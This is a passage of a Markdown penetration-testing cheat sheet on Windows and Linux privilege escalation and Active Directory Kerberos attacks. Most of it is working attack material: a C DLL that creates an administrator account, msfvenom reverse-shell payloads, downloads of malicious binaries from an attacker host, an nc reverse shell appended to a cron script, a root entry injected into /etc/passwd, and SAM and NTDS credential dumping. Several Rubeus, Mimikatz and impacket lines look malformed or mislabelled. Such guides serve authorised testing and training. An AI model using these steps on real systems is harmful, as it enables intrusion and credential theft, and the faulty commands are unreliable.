+6. Replacing the Service Binary with a Malicious Binary It can be a reverse shell generated from msfvenom or for example the program above that will add a new user to the system.
+
+- ### Remember to run the HTTP server on your Kali to be able to bring the binary.
+> ```powershell
+>  iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe
+>
+> move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"
+> 
+> move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
+> ```
+
+7. Restart the Service
+
+- ### Using PowerShell Function
+> ```powershell
+> Restart-Service -Name '<ServiceName>'
+> ```
+- ### Using sc.exe
+> ```cmd
+> sc.exe stop <ServiceName>
+> sc.exe start <ServiceName>
+> ```
+
+8. Restart the System
+- ### First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
+> ```cmd
+> whoami /priv
+>```
+- ### Perform the restart
+> ```cmd
+> shutdown /r /t 0
+> ```
+
+**Service DLL Hijacking**
+
+Windows searches for DLLs in a specific order. To exploit DLL hijacking, understand the order:
+
+    1. The directory from which the application loaded.
+    2. The system directory (e.g., C:\Windows\System32).
+    3. The 16-bit system directory (e.g., C:\Windows\System32\System).
+    4. The Windows directory (e.g., C:\Windows).
+    5. The current directory.
+    6. The directories listed in the PATH environment variable.
+
+1. Display Running Service Information
+
+- ### List running services and their executable paths
+> ```powershell
+> Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
+> ```
+
+2. Check PATH Locations Examine the PATH environment variable to determine where DLLs might be loaded from.
+
+- ### Display the PATH environment variable
+> ```cmd
+> $env:path
+> ```
+
+3. Create a Malicious DLL That Adds a New Administrator User Write a DLL that executes commands when loaded. For example, create a DLL to add a new administrator user.
+> ```c
+> #include <windows.h>
+>
+> BOOL APIENTRY DllMain(
+>     HMODULE hModule,       // Handle to DLL module
+>     DWORD ul_reason_for_call, // Reason for calling function
+>     LPVOID lpReserved      // Reserved
+> ) {
+>     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+>         // Execute system commands to add a new user and grant admin rights
+>         system("net user emma Password123! /add");
+>         system("net localgroup administrators emma /add");
+>     }
+>     return TRUE;
+> }
+> ```
+
+- ### Cross-Compile the DLL
+> ```bash
+> x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
+> ```
+
+4. Creating a DLL that is a Reverse Shell
+- ### For 64-bit DLL
+> ```bash
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
+> ```
+- ### For 32-bit DLL
+> ```bash
+> msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
+> ```
+
+5. Replace the DLL and Restart the Service It can be a reverse shell generated from msfvenom or for example the program above that will add a new user to the system.
+- ### Bring the file from your Kali using an HTTP server
+- ### Move the original DLL (back it up if necessary)
+> ```cmd
+> move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"
+> ```
+- ### Replace it with your malicious DLL
+> ```cmd
+> move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"
+> ```
+- ### Restart the service
+> ```powershell
+> Restart-Service -Name "[serviceToHijack]"
+> ```
+
+6. Verify Execution of the Malicious Code Check if the malicious code (e.g., user creation) has been executed successfully; or if it was the reverse shell you should have receive the connection to the Netcat listener back.
+- ### List users to check if the new user was added
+> ```cmd
+> net user
+> ```
+- ### List local administrators to verify if the new user is an admin
+> ```cmd
+> net localgroup administrators
+> ```
+
+7. Verify that the PATH environment variable still includes the expected directories.
+- ### Display the PATH environment variable
+> ```cmd
+> $env:path
+> ```
+
+**Unquoted Service Paths**
+
+1. List Services with Unquotes Pahts
+> ```cmd
+> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+> ```
+
+Path Resolution Process When Windows attempts to locate the executable, it checks paths in the following order:
+
+    Initial Path Attempt: Windows first attempts to execute the path as specified. For example, if the service path is C:\Program Files\MyApp\app.exe, it tries to run C:\Program Files\MyApp\app.exe.
+    Path Segmentation: If the path contains spaces and is not quoted, Windows tries different combinations by breaking the path at each space and appending .exe to each segment. This means Windows will attempt to execute:
+        C:\Program.exe
+        C:\Program Files\MyApp.exe
+        C:\Program Files\MyApp\app.exe
+    Directory Check: If a malicious executable is placed in one of these directories (e.g., C:\Program Files\), Windows might execute this malicious file instead of the intended app.exe.
+
+For example, for a service path C:\Program Files\ExampleApp\ExampleService.exe, Windows might try: C:\Program.exe (if a malicious file is here). Proper quoting of paths is essential to prevent these vulnerabilities.
+
+2. Review Directory Permissions
+> ```cmd
+> icacls "<PathToDirectory>"
+> ```
+
+3. Automating the Enumeration Process with PowerUp
+[Find PowerUp.ps1 here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+
+- ### Download PowerUp script
+> ```powershell
+> iwr http://<YourServerIP>/PowerUp.ps1 -Outfile PowerUp.ps1
+> ```
+- ### Bypass execution policy and run the script
+> ```powershell
+> powershell -ep bypass
+> . .\PowerUp.ps1
+> ```
+- ### List unquoted service paths
+> ```powershell
+> Get-UnquotedService
+> ```
+
+4. Exploit Unquoted Service Paths
+- ### Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.
+- ### Replace service binary with malicious executable (Manually)
+> ```powershell
+> copy <malicious_file> "C:\Program Files\ExampleApp\Current.exe"
+> ```
+- ### Replace service binary with malicious executable (with PowerUp)
+> ```powershell
+> Write-ServiceBinary -Name '<ServiceName>' -Path '<PathToMaliciousExecutable>'
+> ```
+- ### Restart the service
+> ```powershell
+> Restart-Service <ServiceName>
+> ```
+- ### Verify the service status
+> ```powershell
+> Get-Service -Name '<ServiceName>'
+> ```
+- ### Check event logs for service-related events
+> ```powershell
+> Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}
+> ```
+
+**Scheduled Tasks**
+
+1. List all Scheduled Tasks
+> ```cmd
+> schtasks /query /fo LIST /v
+> ```
+
+2. Review Permissions on the Executable
+> ```cmd
+> icacls "C:\Path\To\ScheduledTaskExecutable.exe"
+> ```
+
+3. Download and Replace the Executable File
+> ```powershell
+> iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe
+>
+> move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak
+>
+> move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
+> ```
+
+**Finding Passwords**
+
+- ### Using Findstr
+> ```cmd
+> findstr /si password *.txt
+> findstr /si password *.xml
+> findstr /si password *.ini
+> ```
+
+- ### Searching in Configuration Files
+> ```cmd
+> dir /s *pass* == *cred* == *vnc* == *.config*
+> ```
+
+- ### Searching in All Files
+> ```cmd
+> findstr /spin "password" *.*
+> findstr /spin "password" *.*
+> ```
+
+- ### Check Specific Files
+These files often contain cleartext credentials:
+-  c:\sysprep.inf
+-  c:\sysprep\sysprep.xml
+-  c:\unattend.xml
+-  %WINDIR%\Panther\Unattend\Unattended.xml
+-  %WINDIR%\Panther\Unattended.xml
+
+- ### Searching for VNC Password Files
+> ```cmd
+> dir c:\*vnc.ini /s /b
+> dir c:\*ultravnc.ini /s /b 
+> dir c:\ /s /b | findstr /si *vnc.ini
+> ```
+
+- ### Shadow Copies (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)
+If you find a Windows.Old folder or can access Volume Shadow Copies, you can copy important files like SYSTEM, SAM, NTDS.dit, SECURITY, and NTUSER.dat for offline credential extraction. Keep in mind that these could also be located in other folders, for example and SMB share folder; the path it is usually something like C:\Windows\System32\SAM or C:\windows.old\Windows\System32\SAM.
+IMPORTANT: if we are using any impacket-tool we could use their built-in function to download the contents to our Kali, but if we are using a reverse shell we can use the strategies of the Section 17 (File Transfers) to bring the files to our Kali.
+
+- ### Key Files to Target
+    SAM: Stores user password hashes.
+    SYSTEM: Used to decrypt SAM and other sensitive files.
+    NTDS.dit: Active Directory database, found on Domain Controllers, containing domain-wide user credentials.
+    SECURITY: Contains LSA secrets, cached credentials, and security policies.
+    NTUSER.dat: Contains user-specific registry information, including credentials for network drives or applications.
+
+- ### Dumping SAM and SYSTEM Files
+Dump the SAM file
+> ```cmd
+> reg save hklm\sam <destination_path>\sam
+> ```
+Dump the SYSTEM file
+> ```cmd
+> reg save hklm\system <destination_path>\system
+> ```
+Extract credentials on Kali
+> ```bash
+> samdump2 <system_file> <sam_file>
+> ```
+or
+> ```bash
+> impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
+> ```
+
+(Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
+> ```text
+> mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
+> ```
+
+- ### Accessing NTDS.dit (Active Directory Database)
+Copy NTDS.dit from a shadow copy
+> ```cmd
+> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
+> ```
+
+- ### Save the SYSTEM hive for decryption
+> ```cmd
+> reg.exe save hklm\system <destination_path>\system.bak
+> ```
+
+- ### Extract AD credentials on Kali
+> ```bash
+> impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
+> ```
+
+(Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
+> ```text
+> mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
+> ```
+
+- ### Dumping SECURITY Hive for LSA Secrets & Cached Credentials
+Dump the SECURITY hive
+> ```cmd
+> reg save hklm\security <destination_path>\security
+> ```
+
+- ### Dump the SYSTEM file
+> ```cmd
+> reg save hklm\system <destination_path>\system
+> ```
+
+- ### Extract LSA Secrets on Kali
+> ```bash
+> impacket-secretsdump -security <security_file> -system <system_file> LOCAL
+> ```
+
+(Optional): use Mimikatz to extract the credentials if it is not possible to bring the files to the Kali.
+> ```text
+> mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
+> ```
+
+- ### Extracting User-Specific Credentials from NTUSER.dat
+Access NTUSER.dat:, download the NTUSER.dat file from a user profile, typically found in C:\Users\<username>\NTUSER.dat
+
+- ### Load the NTUSER.dat hive
+> ```cmd
+> reg load hku\TempHive <path_to_ntuser.dat>
+> ```
+
+Look for credentials and interesting values: Check for saved credentials, network drive mappings, or application data within the user’s registry.
+
+- ### General Volume Shadow Copy Access
+We can use Volume Shadow Copies to access historical versions of key files:
+
+- ### List available shadow copies
+> ```cmd
+> vssadmin list shadows
+> ```
+
+- ### Copy any file from a shadow copy
+> ```cmd
+> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
+> ```
+
+Check [HackTricks](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) for more in-depth PrivEsc
+
+## Linux
+
+| Command                                       | Example Usage                                        |
+|-----------------------------------------------|------------------------------------------------------|
+| **Displays user ID, group ID, and privileges of the current user** | `id`                                                   |
+| **Shows the name of the system's host**       | `hostname`                                            |
+| **Displays the operating system version, release info, and kernel architecture** | `cat /etc/issue` <br> `cat /etc/os-release` <br> `uname -a` |
+| **Lists all running processes with their users, CPU usage, and other details** | `ps aux`                                              |
+| **Lists network interfaces, IP addresses, routing tables, and open ports** | `ip a` <br> `ss -anp`                                 |
+| **Displays the current iptables firewall rules (if applicable)** | `cat /etc/iptables/rules.v4`                          |
+| **Lists scheduled cron jobs for the system and users** | `ls -lah /etc/cron*` <br> `crontab -l` <br> `sudo crontab -l` |
+| **Shows installed packages and versions on Debian-based systems** | `dpkg -l`                                             |
+| **Searches for directories that are writable by the current user** | `find / -writable -type d 2>/dev/null`                |
+| **Displays possible passwords that are in memory** | `strings /dev/mem -n10 | grep -i PASS`               |
+| **Find possible files with sensitive information** | `locate password | more`                              |
+| **Lists currently mounted drives and their mount points** | `cat /etc/fstab` <br> `mount` <br> `lsblk`             |
+| **Lists loaded kernel modules and displays info about a specific module** | `lsmod` <br> `/sbin/modinfo <driver_name>`            |
+| **Finds files with the SUID bit set, which could be used to escalate privileges** | `find / -perm -u=s -type f 2>/dev/null` <br> `sudo -l` <br> `sudo -i` |
+
+**Always check mail Folders**
+- /var/mail
+- /var/spool/mail
+
+**GTFObins**
+- Enumerate sudo privileges
+- Check [GTFObins](https://gtfobins.org/)
+
+**Inspecting Service Footprints**
+
+- ### Monitor active processes for passwords and other credentials
+> ```bash
+> watch -n 1 "ps -aux | grep pass"
+> ```
+
+- ### Sniff passwords on the loopback interface using tcpdump
+> ```bash
+> sudo tcpdump -i lo -A | grep "pass"
+> ```
+
+- ### Inspect Tcpdump
+> ```bash
+> tcpdump -i any -s0 -w capture.pcap
+> tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
+> tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
+> bash
+
+**Cronjobs**
+
+- ### Find CRON Jobs
+> ```bash
+> grep "CRON" /var/log/syslog
+> ```
+or
+> ```bash
+> cat /var/log/cron.log
+> ```
+
+- ### Check permissions for the script
+> ```bash
+> ls -lah /path/to/script.sh
+> ```
+
+- ### Modify the script to add a reverse shell (in case we have permissions to edit), depending on the case another possible payloads could be added, for example adding a new root user.
+> ```bash
+> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
+> ```
+
+### (Optional) Other Commands to Inspect Cron Jobs.
+> ```bash
+> crontab -l
+> ls -alh /var/spool/cron
+> ls -al /etc/ | grep cron
+> ls -al /etc/cron*
+> cat /etc/cron*
+> cat /etc/at.allow
+> cat /etc/at.deny
+> cat /etc/cron.allow
+> cat /etc/cron.deny
+> cat /etc/crontab
+> cat /etc/anacrontab
+> cat /var/spool/cron/crontabs/root
+> ```
+
+**Overwriting /etc/passwd**
+
+1. Create the hash
+> ```bash
+> openssl passwd Password123
+> ```
+
+2. Add the hash to the /etc/passwd file
+### This is just an example using the output of the previous command.
+> ```bash
+> echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
+> ```
+
+3. Switch to the new user
+> ```bash
+> su newroot
+> ```
+
+4. Verify root access
+> ```bash
+> id
+> ```
+
+**Overwriting /etc/shadow**
+
+1. Get the hash out.
+> ```bash
+> cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
+> ```
+
+2. Crack the hash
+### John The Ripper
+> ```bash
+> john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt
+> ```
+### Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
+> ```bash
+> hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
+> ```
+
+3. Show the password
+### John The Ripper
+> ```bash
+> john --show [root_user]_hash.txt
+> ```
+### Hashcat
+> ```bash
+> hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
+> ```
+
+**SETUID Binaries**
+
+Use [suid3num.py](https://github.com/Anon-Exploiter/SUID3NUM/tree/master) or [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+
+
+1. Finding the Process ID (PID) of a Running Binary:
+> ```bash
+> ps u -C [binary_name]
+> ```
+
+2. Inspect Credentials of a Running Process:
+> ```bash
+> cat /proc/[PID]/status | grep Uid
+> ```
+
+3. Getting a Reverse Shell Using find:
+> ```bash
+> find [directory] -exec [path_to_shell] \;
+> ```
+
+Exploit:
+### Replace [vulnerable_binary] with the name of the binary you are targeting.
+> ```bash
+> find / -name [vulnerable_binary] -exec /bin/bash -p \;
+> ```
+
+**Capabilities**
+
+1. Enumerate Capabilities:
+> ```bash
+> /usr/sbin/getcap -r / 2>/dev/null
+> ```
+
+2. Inspect a Specific Binary for Capabilities:
+> ```text
+> getcap [binary_path]
+> ```
+### For example
+> ```bash
+> getcap /usr/bin/nmap
+> ```
+
+3. Adjust Capabilities (Requires root):
+> ```text
+> setcap [capabilities] [binary_path]
+> ```
+### Example to add CAP_DAC_OVERRIDE to a binary
+> ```bash
+> setcap cap_dac_override=eip /path/to/binary
+> ```
+
+4. Remove Capabilities (Requires root):
+> ```text
+> setcap -r [binary_path]
+> ``` 
+### For example
+> ```bash
+> setcap -r /usr/bin/nmap
+> ```
+
+| Capability               | Description                                                                 | Potential Use                                                   |
+|--------------------------|-----------------------------------------------------------------------------|-----------------------------------------------------------------|
+| **CAP_AUDIT_CONTROL**     | Allows enabling or disabling kernel auditing.                               | Can be used to disable auditing mechanisms and evade detection. |
+| **CAP_AUDIT_WRITE**       | Allows writing records to the kernel auditing log.                          | Can be used to manipulate or inject log entries, potentially covering up malicious activities. |
+| **CAP_BLOCK_SUSPEND**     | Prevents the system from suspending or hibernating.                         | Can be used to keep a system awake, which might be useful for long-running attacks or preventing automatic lockdowns. |
+| **CAP_CHOWN**             | Allows arbitrary changes to file UIDs and GIDs.                             | Enables changing file ownership, potentially allowing privilege escalation or tampering with critical files. |
+| **CAP_DAC_OVERRIDE**      | Bypasses file read, write, and execute permission checks.                   | Provides unrestricted access to files, regardless of permissions, which can be used to access or modify sensitive files. |
+| **CAP_DAC_READ_SEARCH**   | Bypasses file and directory read and execute permission checks.             | Allows reading and searching files and directories that would normally be restricted. |
+| **CAP_FOWNER**            | Bypasses permission checks on operations that require the filesystem UID of the process to match the UID of the file. | Allows performing actions on files that normally require matching ownership, potentially enabling unauthorized file modifications. |
+| **CAP_IPC_LOCK**          | Allows locking memory into RAM.                                             | Can be used to prevent critical memory from being swapped out, which may be useful for maintaining persistence or performance in an attack. |
+| **CAP_KILL**              | Allows sending signals to processes owned by other users.                   | Can be used to terminate or signal processes belonging to other users, potentially disrupting services or attacking other users' processes. |
+| **CAP_MAC_ADMIN**         | Allows configuring or changing Mandatory Access Control (MAC) settings.      | Provides the ability to alter MAC policies, which could weaken security policies or bypass certain security controls. |
+| **CAP_NET_BIND_SERVICE**  | Allows binding sockets to privileged ports (ports below 1024).              | Enables services to listen on standard ports (e.g., 80, 443) without requiring root privileges, which might be used to disguise malicious services as legitimate ones. |
+| **CAP_NET_RAW**           | Allows using raw and packet sockets.                                        | Can be used for network sniffing, crafting custom packets, or bypassing network filters and protections. |
+| **CAP_SETGID**            | Allows changing the GID of a process.                                       | Enables changing the group ID of processes, which can affect group-based permissions and access controls. |
+| **CAP_SETPCAP**           | Allows transferring and removing capabilities from processes.               | Enables modifying the capabilities of running processes, which can be used to escalate privileges or evade detection. |
+| **CAP_SETUID**            | Allows changing the UID of a process.                                       | Provides the ability to change the user ID of processes, potentially leading to privilege escalation or impersonation. |
+
+**Wildcard Exploitation**
+
+Wildcard exploitation involves leveraging wildcards (*, ?, []) in file and command operations to gain unauthorized access or perform unintended actions. This section covers common methods and examples for exploiting wildcards in Linux environments.
+
+Wildcard Basics
+    Asterisk (*): Matches any number of characters, including zero.
+    Question Mark (?): Matches exactly one character.
+    Square Brackets ([]): Matches any one of the enclosed characters.
+
+Exploitation Guide
+Since this is a complex exploitation technique, if we find a script, cron jobs, tasks or else for which we can perform wildcard exploitation, we could follow these two guides on how to do it:
+
+    Tar Wildcard Injection
+    Wildcards with tar
+
+Exploiting Wildcards in Command Execution
+    Wildcard Expansion in Commands: Wildcards can be used to execute commands on multiple files or directories. This can be exploited if an application or script does not handle wildcards properly.
+
+ls /var/log/*
+
+    Misconfigured Scripts: If a script uses wildcards in a vulnerable way, it can lead to command injection or unintended behavior.
+
+# Example vulnerable script
+tar -cvf archive.tar.gz /var/log/*
+
+Exploiting Wildcards in File Operations
+
+    File Creation and Modification: Wildcards can be used to create or modify multiple files if the application or script does not properly sanitize input.
+
+touch /tmp/file_*
+
+    Race Conditions: Wildcards in file operations can be exploited to create race conditions.
+
+# If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
+cp /etc/* /tmp/backup/
+
+**User Installed Software**
+
+Check for third-party software installed by the user. These programs might have vulnerabilities, so it's important to investigate further.
+
+Common directories for user-installed software:
+
+- /usr/local/
+- /usr/local/src
+- /usr/local/bin
+- /opt/
+- /home
+- /var/
+- /usr/src/
+
+Check installed software by distribution:
+
+### Debian/Ubuntu
+> ```bash
+> dpkg -l
+> ```
+### CentOS/openSUSE/Fedora/RHEL
+> ```bash
+> rpm -qa
+> ```
+### OpenBSD/FreeBSD
+> ```bash
+> pkg_info
+> ```
+
+**World Writable**
+
+### World-writable directories
+> ```bash
+> find / -writable -type d 2>/dev/null
+> find / -perm -222 -type d 2>/dev/null
+> find / -perm -o w -type d 2>/dev/null
+> ```
+### World-executable directories
+> ```bash
+> find / -perm -o x -type d 2>/dev/null
+> ```
+### World-writable and executable directories
+> ```bash
+> find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+> ```
+
+---
+
+## Active Directory
+
+**Quick Reference**
+
+- Nmap Scripting Scan
+### Check for Kerberos service availability and get basic information
+> ```bash
+> nmap -p 88 --script kerberos-enum-users <target_ip>
+> ```
+### Check for common Kerberos vulnerabilities
+> ```bash
+> nmap -p 88 --script kerberos-brute <target_ip>
+> ```
+### Enumerate SPNs (Service Principal Names)
+> ```bash
+> nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
+> ```
+
+- AS-REP Roasting: extract accounts with pre-authentication disabled using GetNPUsers.py (impacket-GetNPUsers); keep in mind that should also use kerbrute to find possible valid usernames, commands for this are in the Section 1.4.7.
+> ```bash
+> impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -format hashcat
+> ```
+or
+> ```bash
+> impacket-GetNPUsers <domain>/ -no-pass -usersfile <path_to_userlist> -dc-ip <domain_controller_ip>
+> ```
+- Crack the found hashes
+> ```bash
+> hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+> ```
+
+- Kerberoasting: use GetUserSPNs.py to extract SPNs.
+> ```bash
+> impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc-ip>
+> ```
+- Crack the resulting hash
+> ```bash
+> hashcat -m 13100 kerberoast.txt rockyou.txt
+> ```
+
+- Enumerate Kerberos Principal Names: use kerbrute to enumerate valid user accounts by attempting to authenticate with a list of usernames.
+> ```bash
+> kerbrute userenum -d <domain> -p <userlist> <target_ip>
+> ```
+or
+> ```bash
+> ./kerbrute userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+> ```
+
+- Perform Kerberos Ticket Extraction (AS-REP Roasting): request non-preauthenticated Kerberos tickets for a list of users.
+> ```bash
+> impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
+> ```
+
+-Perform Kerberos Ticket Request with AS-REP Roasting: request a Ticket Granting Ticket (TGT) for a specific user.
+> ```bash
+> impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
+> ```
+
+- Crack Kerberos Tickets
+> ```bash
+> john --wordlist=<wordlist> <ticket_file>
+> ```
+### or
+> ```bash
+> hashcat -m 13100 <ticket_file> <wordlist>
+> ```
+
+- Kerberos Ticket Extraction: request a TGT or Service Ticket (TGS) using specified credentials.
+### Request a TGT (Ticket Granting Ticket)
+> ```bash
+> impacket-getTGT -dc-ip <dc_ip> <domain>/<username>:<password>
+> ```
+
+-  Request a Service Ticket (TGS)
+> ```bash
+> impacket-GetST -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
+> ```
+
+- Kerberoasting: extract and crack service tickets to gain access to service accounts.
+### Extract all service tickets for offline cracking
+> ```bash
+> impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>
+> ```
+
+- Crack the extracted tickets with John the Ripper or Hashcat
+> ```bash
+> john --wordlist=<wordlist> <tickets_file>
+> ```
+### or
+> ```bash
+> hashcat -m 13100 <tickets_file> <wordlist>
+> ```
+
+- Kerberos Brute Forcing: perform brute force attacks on Kerberos tickets.
+> ```
+> ./kerbrute -d <domain> -t <target_ip> -u <username> -p <password_list>
+> ```
+
+- Kerberos Ticket Manipulation: use tools to request, manipulate, and renew Kerberos tickets for privilege escalation or impersonation.
+### Renew a TGT (for Kerberos ticket manipulation)
+> ```bash
+> impacket-psexec <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>
+> ```
+
+- Perform Kerberos attacks with Rubeus
+> ```cmd
+> rubeus.exe asktgt /user:<username> /rc4:<password>
+> rubeus.exe tgtdeleg /user:<username> /rc4:<password>
+> rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
+> ```
+
+- Kerberos Ticket Dumping: extract Kerberos tickets from memory for offline analysis.
+### Dump Kerberos tickets from memory using Mimikatz
+> ```text
+> mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
+> ```
+
+- Kerberos Pre-Authentication: identify weak configurations that might allow attackers to perform brute force attacks.
+### Test for weak pre-authentication configurations
+> ```bash
+> ./kerbrute -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
+> ```
+
+- Kerberos Silver Ticket Attacks: forge high-value Kerberos tickets for access and privilege escalation.
+### Create a silver ticket with Rubeus
+> ```cmd
+> rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
+> ```
+
+Steps to Perform Silver Ticket Attack
+### 1. Obtain a Valid TGT (Ticket Granting Ticket)
+> ```bash
+> impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>
+> ```
+### 2. Forge a Silver Ticket
+> ```bash
+> impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
+> ```
+
+Kerberos Golden Ticket Attacks: forge high-value Kerberos tickets for access and privilege escalation.
+### Create a golden ticket with Rubeus
+> ```cmd
+> rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
+> ```
+
+Steps to Perform Golden Ticket Attack
+
+### 1. Obtain KRBTGT NTLM Hash
+> ```bash
+> impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>
+> ```
+### 2. Generate a Golden Ticket
+> ```bash
+> ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>
+> ```
+### 3. Use the Golden Ticket
+> ```bash
+> impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>
+> ```
+### (Optional) Pass the Golden Ticket
+> ```bash
+> impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
+> ```
+
+### Example of Enumeration
+- Perform LDAP Search: retrieve potential user and password information.
+> ```bash
+> ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
+> ```
+- Enumerate DNS: gather information about key servers within the domain.
+> ```bash
+> gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
+> ```
+
+- Check SMB Shares
+
+### Enumerate LDAP Services:
+> ```bash
+> nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
+> ```
+
+- Find Valid Users:
+### Using [Kerbrute](https://github.com/ropnop/kerbrute/releases)
+> ```bash
+> ./kerbrute -d [domain].com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames
+> ```
+
+### Using CrackMapExec
+> ```bash
+> crackmapexec smb [domain].com -u '' -p '' --users
+> ```
+
+- Enumerate All AD Users: this has to be done after having valid credentials.
+### Using GetAdUsers.py (same tool)
+> ```bash
+> impacket-GetADUsers -all -dc-ip <dc_ip> -u <username> -p <password> <domain>
+> ```
+### Using Enum4Linux
+> ```bash
+> enum4linux -a -u "<username>" -p "<password>" <dc_ip>
+> ```
+
+## Basic Enumeration
+
+- Find my Domain SID:
+### Using PowerShell
+> ```powershell
+> (Get-ADDomain).DomainSID
+> ```
+
+### Using CMD
+> ```cmd
+> whoami /user
+> ```
+
+### Using vmic
+> ```cmd
+> wmic useraccount where name='[usernameToFind]' get sid
+> ```
+
+- Find the name of my domain controller server:
+### Using PowerShell
+> ```powershell
+> Get-ADDomainController -Filter *
+> ```
+
+### Using nltest
+> ```cmd
+> nltest /dclist:[YourDomainName]
+> ```
+
+### Using netdom
+> ```cmd
+> netdom query dc
+> ```
+
+### Using nslookup
+> ```bash
+> nslookup yourdomain.com
+> ```
+
+### Using ADUC
+### Open ADUC --> In the Domain Controllers Organizational Unit (OU), you can find the domain controllers listed there.
+
+- Find Service Account Names:
+### Using PowerShell
+### List All User Accounts with Service Principal Names (SPNs)
+> ```powershell
+> Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
+> ```
+
+### Find Specific Service Accounts (e.g., SQL Server)
+> ```powershell
+> Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
+> ```
+
+### Checking Running Services
+> ```powershell
+> Get-WmiObject -Class Win32_Service | Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne "LocalService" -and $_.StartName -ne "NetworkService" } | Select-Object Name, StartName
+> ```
+or
+> ```cmd
+> sc queryex type= service
+> ```
+
+### Using nltest
+> ```cmd
+> nltest /domain_trusts
+> ```
+
+### Identify Specific Service Account by SPN
+> ```powershell
+> Get-ADServiceAccount -Filter * | Select-Object Name, ServicePrincipalNames
+> ```
+
+### Using ADUC
